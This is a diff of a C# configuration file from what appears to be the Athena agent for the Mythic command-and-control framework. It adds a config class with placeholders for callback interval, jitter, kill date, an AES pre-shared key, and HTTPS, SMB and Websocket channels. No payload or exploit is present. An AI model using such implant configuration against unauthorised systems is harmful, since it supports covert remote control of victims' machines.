@@ -1,15 +1,38 @@
 ﻿using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Net.Http;
-using System.Text;
 using System.Threading.Tasks;
 
 namespace Athena.Config
 {
-    /**
+    public class MythicConfig
+    {
+        public HTTPS httpConfig { get; set; }
+        public SMB smbConfig { get; set; }
+        public Websocket websocketConfig { get; set; }
+        public string uuid { get; set; }
+        public DateTime killDate { get; set; }
+        public int sleep { get; set; }
+        public int jitter { get; set; }
+        public string psk { get; set; }
+        public bool encryptedExchangeCheck { get; set; }
+
+
+        public MythicConfig()
+        {
+            this.httpConfig = new HTTPS();
+            this.smbConfig = new SMB();
+            this.websocketConfig = new Websocket();
+            this.uuid = "%UUID%";
+            this.psk = "AESPSK";
+            this.killDate = DateTime.Parse("killdate");
+            this.sleep = Int32.Parse("callback_interval");
+            this.jitter = Int32.Parse("callback_jitter");
+            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+
+        }
+    }
     public class HTTPS
     {
         public string userAgent { get; set; }
@@ -63,5 +86,10 @@ namespace Athena.Config
             }
         }
     }
-    **/
+    public class Websocket
+    {
+    }
+    public class SMB
+    {
+    }
 }
